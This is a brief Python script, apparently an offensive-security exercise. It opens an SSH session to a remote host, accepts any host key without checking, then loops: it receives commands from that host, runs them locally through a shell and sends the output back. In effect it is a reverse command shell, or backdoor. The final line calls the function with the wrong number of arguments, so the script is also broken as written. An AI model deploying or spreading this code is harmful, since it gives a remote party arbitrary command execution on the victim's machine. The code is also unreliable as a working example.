import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('/home/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Set policy to use when connecting to servers without a known host key.
    # Policy for automatically adding the hostname and new host key to the local .HostKeys object, and saving it. This is used by .SSHClient 
    client.connect(ip,username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024)) #lê o banner
        while True:
            command = ssh_session.recv(1024) #obtem o comando do servidor SSH
            try:
                cmd_output = subprocess.check_output(command, shell=True) # Run command with arguments and return its output as a byte string.
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

ssh_command('')